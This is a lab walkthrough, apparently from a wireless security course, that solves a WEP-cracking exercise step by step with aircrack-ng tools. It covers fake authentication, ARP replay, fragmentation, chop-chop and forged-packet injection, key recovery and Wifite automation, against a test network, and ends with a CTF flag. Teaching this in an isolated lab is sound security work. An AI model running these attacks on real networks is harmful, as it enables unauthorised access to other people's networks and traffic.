# Lab 04: WEP Cracking - Walkthrough

Complete step-by-step solution guide for cracking WEP encryption.

```
+===============================================================+
|                    WALKTHROUGH GUIDE                           |
+===============================================================+
|  WARNING: This contains complete solutions.                   |
|  Try the exercises yourself first!                            |
+===============================================================+
```

## Legal Disclaimer

```
+=====================================================================+
|                         LEGAL WARNING                                |
+=====================================================================+
|  This walkthrough is for EDUCATIONAL PURPOSES ONLY.                 |
|                                                                      |
|  - Only perform these actions on networks you OWN                   |
|  - Or have EXPLICIT WRITTEN PERMISSION to test                      |
|  - Cracking WEP on unauthorized networks is a CRIMINAL OFFENSE      |
|  - Set up an isolated lab environment for practice                  |
+=====================================================================+
```

## Lab Environment Setup

### Creating an Isolated Test Network

```
Recommended Test Setup:

┌─────────────────────────────────────────────────────────────┐
│                    ISOLATED LAB                              │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   [Kali Linux]                                              │
│       │                                                      │
│       │ USB WiFi Adapter (Monitor Mode)                     │
│       │                                                      │
│       ▼                                                      │
│   ))) WiFi Signal (((                                       │
│       │                                                      │
│       ▼                                                      │
│   [Test Router]  ◄── WEP 64/128-bit enabled                │
│       │              NOT connected to internet              │
│       │                                                      │
│       ▼                                                      │
│   [Test Client]  ◄── Smartphone or laptop                  │
│                      Generating traffic                     │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### Router Configuration (Example)

```
Test Router WEP Settings:
- SSID: TestWEP
- Security: WEP
- Key Length: 64-bit (10 hex characters) or 128-bit (26 hex characters)
- Example Key: 1234567890 (for 64-bit)
```

## Exercise 1: Basic WEP Crack - Complete Walkthrough

### Step 1: Identify Your Wireless Interface

```bash
# List interfaces
iwconfig

# Example output:
# wlan0     IEEE 802.11  ESSID:off/any
#           Mode:Managed  Access Point: Not-Associated

# Get your adapter's MAC address
ip link show wlan0 | grep ether
# Example: ether 00:11:22:33:44:55
```

### Step 2: Enable Monitor Mode

```bash
# Check for interfering processes
sudo airmon-ng check

# Output:
# Found 2 processes that could cause trouble.
# Kill them using 'airmon-ng check kill' before putting
# the card in monitor mode, they will interfere by changing channels
# and sometimes putting the interface back in managed mode
#
#     PID Name
#     723 NetworkManager
#     912 wpa_supplicant

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Output:
# PHY     Interface       Driver          Chipset
# phy0    wlan0           rtl8812au       Realtek Semiconductor Corp.
#                 (monitor mode enabled on wlan0mon)

# Verify monitor mode
iwconfig wlan0mon
# Should show: Mode:Monitor
```

### Step 3: Discover WEP Networks

```bash
# Scan for WEP-only networks
sudo airodump-ng --encrypt WEP wlan0mon
```

**Sample Output:**
```
 CH  3 ][ Elapsed: 30 s ]

 BSSID              PWR  Beacons    #Data  #/s  CH   MB   ENC  CIPHER  AUTH ESSID

 AA:BB:CC:DD:EE:FF  -42      185       23    0   6   54   WEP  WEP         TestWEP

 BSSID              STATION            PWR   Rate    Lost    Frames  Probes

 AA:BB:CC:DD:EE:FF  11:11:11:11:11:11  -55   54 - 1       0       15
```

**Record these values:**
- BSSID: `AA:BB:CC:DD:EE:FF`
- Channel: `6`
- ESSID: `TestWEP`
- Client: `11:11:11:11:11:11`

### Step 4: Start Targeted Capture

```bash
# Open Terminal 1 - Start capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_crack wlan0mon
```

**Leave this running and monitor the #Data column!**

```
 CH  6 ][ Elapsed: 1 min ][ 2024-01-15 15:30

 BSSID              PWR RXQ  Beacons    #Data  #/s  CH   MB   ENC  CIPHER  AUTH ESSID

 AA:BB:CC:DD:EE:FF  -42  95      456      127    2   6   54   WEP  WEP         TestWEP

 BSSID              STATION            PWR   Rate    Lost    Frames  Probes

 AA:BB:CC:DD:EE:FF  11:11:11:11:11:11  -55   54 - 1       2       85
```

### Step 5: Fake Authentication

```bash
# Open Terminal 2 - Associate with AP
sudo aireplay-ng -1 0 -e TestWEP -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# Parameters explained:
# -1        : Fake authentication attack
# 0         : Reassociation timing (0 = once)
# -e TestWEP: ESSID (network name)
# -a        : AP BSSID (access point MAC)
# -h        : Your adapter's MAC address
```

**Expected Successful Output:**
```
15:31:45  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:FF) on channel 6
15:31:45  Sending Authentication Request (Open System) [ACK]
15:31:45  Authentication successful
15:31:45  Sending Association Request [ACK]
15:31:45  Association successful :-) (AID: 1)
```

**If Authentication Fails:**
```bash
# Try with delay
sudo aireplay-ng -1 6000 -e TestWEP -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# -1 6000 : Reassociate every 6 seconds
```

### Step 6: ARP Request Replay Attack

```bash
# Open Terminal 3 - Start ARP replay
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# Parameters:
# -3    : ARP request replay attack
# -b    : AP BSSID
# -h    : Your MAC address
```

**Expected Output (Waiting for ARP):**
```
15:32:00  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE:FF) on channel 6
Saving ARP requests in replay_arp-0115-153200.cap
You should also start airodump-ng to capture replies.
Read 1250 packets (got 0 ARP requests and 0 ACKs), sent 0 packets...(0 pps)
Read 2500 packets (got 0 ARP requests and 0 ACKs), sent 0 packets...(0 pps)
```

**Generate Traffic (on test client):**
- Ping the router: `ping 192.168.1.1`
- Browse to any IP
- Or wait for DHCP renewal

**Output When ARP Captured:**
```
Read 3750 packets (got 1 ARP requests and 0 ACKs), sent 0 packets...(0 pps)
Read 4100 packets (got 1 ARP requests and 523 ACKs), sent 523 packets...(523 pps)
Read 4500 packets (got 1 ARP requests and 1045 ACKs), sent 1045 packets...(522 pps)
Read 5000 packets (got 1 ARP requests and 1567 ACKs), sent 1567 packets...(522 pps)
```

**Watch Terminal 1 (airodump-ng) - Data count increasing rapidly:**
```
 BSSID              PWR RXQ  Beacons    #Data  #/s  CH   MB   ENC  CIPHER  AUTH ESSID

 AA:BB:CC:DD:EE:FF  -42  95     1234    15678  520   6   54   WEP  WEP         TestWEP
                                         ↑
                                 Rapidly increasing!
```

### Step 7: Crack the WEP Key

```bash
# Open Terminal 4 - Start cracking (can run while collecting)
sudo aircrack-ng wep_crack-01.cap

# Or specify BSSID if multiple networks in capture
sudo aircrack-ng -b AA:BB:CC:DD:EE:FF wep_crack-01.cap
```

**Cracking in Progress:**
```
                                 Aircrack-ng 1.7

                 [00:00:05] Tested 2834 keys (got 23567 IVs)

   KB    depth   byte(vote)
    0    0/  1   12(56832) 3A(47616) 7F(46848) 8C(46592) 2B(45824)
    1    0/  1   34(58368) F8(48128) 93(47360) 1A(46080) C4(45824)
    2    0/  2   56(54784) 45(48896) 7D(46336) E2(45568) 8A(45312)
    3    0/  1   78(57024) 9F(47104) 3B(46592) 72(46080) 1E(45568)
    4    0/  1   90(59136) 2C(46848) F1(46336) 68(45824) A7(45312)

     Current encryption type: WEP (40 or 104 bits)
```

**Key Found:**
```
                                 Aircrack-ng 1.7

                 [00:00:15] Tested 58234 keys (got 45678 IVs)

   KB    depth   byte(vote)
    0    0/  1   12(75264) 3A(47616) 7F(46848) 8C(46592) 2B(45824)
    1    0/  1   34(73728) F8(48128) 93(47360) 1A(46080) C4(45824)
    2    0/  1   56(71680) 45(48896) 7D(46336) E2(45568) 8A(45312)
    3    0/  1   78(69632) 9F(47104) 3B(46592) 72(46080) 1E(45568)
    4    0/  1   90(76800) 2C(46848) F1(46336) 68(45824) A7(45312)

                         KEY FOUND! [ 12:34:56:78:90 ]
        Decrypted correctly: 100%
```

### Step 8: Verify the Key

```bash
# Connect to the network using recovered key
# Key format: Remove colons for passphrase
# 12:34:56:78:90 → 1234567890

# Test decryption of captured packets
sudo airdecap-ng -w 1234567890 wep_crack-01.cap

# Output:
# Total number of packets read        : 156789
# Total number of WEP data packets    :  45678
# Total number of WPA data packets    :      0
# Number of decrypted WEP  packets    :  45678
# Number of corrupted WEP  packets    :      0
# Number of decrypted WPA  packets    :      0
```

## Exercise 2: Low Traffic Environment

When there's no client traffic to capture ARP packets.

### Method 1: Fragmentation Attack

```bash
# Step 1: Fake authentication (same as before)
sudo aireplay-ng -1 0 -e TestWEP -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# Step 2: Run fragmentation attack
sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# Output when successful:
# Use this packet ? (y/n)
# Press 'y' to accept a suitable data packet

# Saving chosen packet in replay_src-0115-160000.cap
# Trying to get 1500 bytes of a keystream
# Got RELAYED packet!!
# Thats our ARP packet!
# Saving keystream in fragment-0115-160000.xor
# Now you can build a packet with packetforge-ng out of that 1500 bytes keystream
```

### Method 2: Create ARP Packet with Packetforge

```bash
# Create an ARP packet using obtained keystream
sudo packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 \
    -k 255.255.255.255 -l 255.255.255.255 \
    -y fragment-0115-160000.xor -w arp-request

# Parameters:
# -0    : ARP packet type
# -k    : Destination IP (broadcast)
# -l    : Source IP (broadcast)
# -y    : Keystream file
# -w    : Output file

# Output:
# Wrote packet to: arp-request
```

### Method 3: Inject Forged Packet

```bash
# Inject the forged ARP packet
sudo aireplay-ng -2 -r arp-request wlan0mon

# Output:
# Sending forged requests...

# Now the AP will respond, generating IVs
```

### Method 4: Chop-Chop Attack (Alternative)

```bash
# Alternative to fragmentation
sudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# This attack:
# 1. Captures a packet
# 2. Decrypts it byte by byte
# 3. Generates a keystream
# Time: ~10 minutes per packet
```

## Exercise 3: Key Complexity Analysis

### Testing 64-bit vs 128-bit WEP

**64-bit WEP (40-bit key + 24-bit IV):**
```bash
# Configure router for 64-bit WEP
# Key example: 1234567890 (10 hex characters)

# Run standard attack
# Observe: Usually cracks in ~20,000-30,000 IVs
```

**128-bit WEP (104-bit key + 24-bit IV):**
```bash
# Configure router for 128-bit WEP
# Key example: 12345678901234567890123456 (26 hex characters)

# Run standard attack
# Observe: Usually cracks in ~40,000-80,000 IVs
```

**Results Comparison:**

| Key Length | IVs Needed | Time (500 pps) | Security Improvement |
|------------|------------|----------------|----------------------|
| 64-bit | ~20,000 | ~40 seconds | Baseline |
| 128-bit | ~40,000 | ~80 seconds | Only 2x longer |

**Conclusion:** Key length doesn't significantly improve security because the IV weakness is independent of key length.

## Automated Approach: Wifite

```bash
# Start wifite in WEP mode
sudo wifite --wep

# Wifite will automatically:
# 1. Scan for WEP networks
# 2. Select target (or let you choose)
# 3. Run fake authentication
# 4. Attempt multiple attack methods
# 5. Crack the key

# Example output:
#   NUM   ESSID              CH  ENCR  POWER  WPS?  CLIENT
#    1    TestWEP             6  WEP    42db    no      1

# [+] (1/1) starting attacks against TestWEP
# [+] Associated with TestWEP (AA:BB:CC:DD:EE:FF)
# [+] Started ARP replay attack on TestWEP
# [+] 12,345 IVs captured from TestWEP
# [+] 34,567 IVs captured from TestWEP
# [+] Cracking TestWEP with 45,678 IVs
# [+] KEY FOUND: 1234567890
```

## Cleanup and Restoration

```bash
# Stop all attacks (Ctrl+C in each terminal)

# Restore managed mode
sudo airmon-ng stop wlan0mon

# Restart NetworkManager
sudo systemctl start NetworkManager

# Verify restoration
iwconfig wlan0

# Test internet connectivity
ping -c 3 google.com
```

## Troubleshooting

### "Association Timeout"

```bash
# Try with keep-alive reassociation
sudo aireplay-ng -1 6000 -o 1 -q 10 -e TestWEP -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon

# -o 1  : Send only 1 auth packet at a time
# -q 10 : Send keep-alive every 10 seconds
```

### "Got 0 ARP requests"

```bash
# Check if there's a connected client
# If no client, use fragmentation attack

# Or try interactive replay
sudo aireplay-ng -2 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon
# Press 'y' when a suitable packet is detected
```

### "Injection Not Working"

```bash
# Test injection capability
sudo aireplay-ng --test -a AA:BB:CC:DD:EE:FF wlan0mon

# If fails, try:
# 1. Use different adapter
# 2. Update drivers
# 3. Check channel matches AP
```

### "Cracking Takes Too Long"

```bash
# Check IV count - need at least 40,000 for reliable cracking
# If stuck, generate more traffic:

# Speed up ARP replay
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 -x 1000 wlan0mon
# -x 1000 : Send 1000 packets per second
```

## Summary

You've successfully learned:

1. **Monitor Mode Setup**: airmon-ng check kill && airmon-ng start
2. **Network Discovery**: airodump-ng --encrypt WEP
3. **Fake Authentication**: aireplay-ng -1
4. **Traffic Generation**: aireplay-ng -3 (ARP replay)
5. **Alternative Methods**: Fragmentation (-5), Chop-chop (-4)
6. **Key Cracking**: aircrack-ng

**Key Statistics from Testing:**
- Average crack time: 2-5 minutes on active network
- Minimum IVs needed: ~40,000 with PTW attack
- WEP is BROKEN regardless of key length

## Next Steps

Continue to [Lab 05: WPA/WPA2 Attacks](../05-wpa-attacks/) to learn about more sophisticated attacks on modern WiFi security.

---

**Flag:** `FLAG{w3p_1s_d34d}`
